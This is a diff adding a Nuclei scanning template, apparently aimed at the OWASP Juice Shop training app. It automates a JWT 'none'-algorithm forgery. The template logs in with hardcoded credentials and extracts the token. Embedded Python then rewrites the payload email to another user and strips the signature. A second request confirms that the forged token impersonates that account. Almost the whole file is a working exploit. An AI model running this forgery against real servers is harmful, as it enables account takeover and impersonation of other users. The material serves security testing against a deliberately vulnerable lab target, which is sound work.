@@ -1,0 +1,87 @@
+id: unsigned_jwt_Vulnerable
+
+info:
+  name: Unsigned JWT Automation
+  author: your_name
+  severity: info
+  description: Automating JWT token manipulation to test for unsigned JWT vulnerability.
+
+flow: |
+  http(1) && code() && http(2)
+
+
+requests:
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"email":"trycyber@gmail.com","password":"trycyber"}
+
+    extractors:
+      - type: regex
+        name: jwt_token
+        internal: true
+        group: 1
+        regex:
+          - '"token"\s*:\s*"([^"]+)"'
+
+  - raw:
+      - |
+        GET /rest/user/whoami HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Authorization: Bearer {{code_response}}
+        Cookie: language=en; token={{code_response}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "jwtn3d@juice-sh.op"
+        part: body  
+        
+    extractors:
+      - type: regex
+        name: "found_email"
+        regex:
+          - '"([a-zA-Z0-9._%+-]+@juice-sh\.op)"'
+        part: body
+
+code: 
+  - engine: 
+      - python3
+    source: |
+      import base64
+      import json
+      import os
+
+      def b64url_encode(data):
+          return base64.urlsafe_b64encode(data).decode().rstrip("=")
+
+      def b64url_decode(data):
+          padding = '=' * (4 - len(data) % 4)
+          return base64.urlsafe_b64decode(data + padding)
+
+      jwt_input = os.getenv('jwt_token','')
+      header_b64, payload_b64, signature = jwt_input.split('.')
+
+      # Decode and modify payload
+      payload_json = json.loads(b64url_decode(payload_b64).decode())
+      payload_json['data']['email'] = "jwtn3d@juice-sh.op"
+
+      # New header with 'none' algorithm
+      new_header = {"typ": "JWT", "alg": "none"}
+      new_header_b64 = b64url_encode(json.dumps(new_header).encode())
+      new_payload_b64 = b64url_encode(json.dumps(payload_json).encode())
+
+      # Assemble unsigned token
+      final_token = f"{new_header_b64}.{new_payload_b64}."
+      print(final_token)
+# digest: 490a0046304402200b31909b5116f9fa21fe0b94e5b9ec9fb17ae76050efa9e3e8da0e81481c923e022059ef6b473089aa942ecfe49a6b9dfead78377d6af9b8a24fa341a300006b9b54:0dd34f63ed422f65711fe796f66903bf
